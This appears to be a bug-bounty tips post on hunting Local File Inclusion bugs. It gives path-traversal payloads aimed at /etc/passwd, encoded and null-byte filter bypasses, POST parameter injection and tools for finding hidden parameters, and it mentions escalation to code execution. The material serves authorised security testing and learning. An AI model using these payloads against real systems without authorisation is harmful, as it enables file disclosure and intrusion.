### 🔍 Real-World LFI Hunting Tips (Local File Inclusion)

> LFI is one of those classic bugs that keeps showing up — if you know where to look. Here’s how to hunt them based on real-world findings:


### 1️⃣ GET Path Injection

Try this in URL params:
```
example.com/page=///../../../../etc/passwd
```
💡 Tip: Start with triple slashes /// to bypass filters.

Use Burp Suite or ffuf to fuzz with payloads like:
```
../etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
### 2️⃣ POST LFIs

Some LFI bugs hide in POST requests. Look for parameters like:
```
POST /router.jsp  
page=../etc/passwd
```
💡 Tip: Use Burp Repeater to modify POST body and test LFI payloads.

### 3️⃣ Hidden Params (The Real Gold)

Many LFI bugs come from undocumented or hidden parameters.

✅ Tools to find them : ParamSpider , Arjun

JS file analysis (look for .js files that reference “file=”, “path=”, etc.)

🔓 Bypass Tricks

🌀 Encoding payloads:
```
%2e%2e%2f = ../
%00 null-byte (older PHP apps)
URL double encoding: %252e%252e%252f
```
Use these to bypass simple filters or WAFs.

#### ⚠️ Stay Ethical

LFI can lead to:
⚡️Arbitrary file read
⚡️RCE via log injection or /proc/self/environ
⚡️Sensitive config exposure
⚠️Only test on targets you're authorized to assess!

⸻

💥 Stay sharp, automate smart, and always verify paths manually.

📢 Join us for daily hunting tricks and recon scripts → [@cybersecplayground](https://t.me/cybersecplayground)

❤️ Give Star & Share if you found this helpful
> #bugbounty #lfi #infosec #recon #exploit #pentest #osint
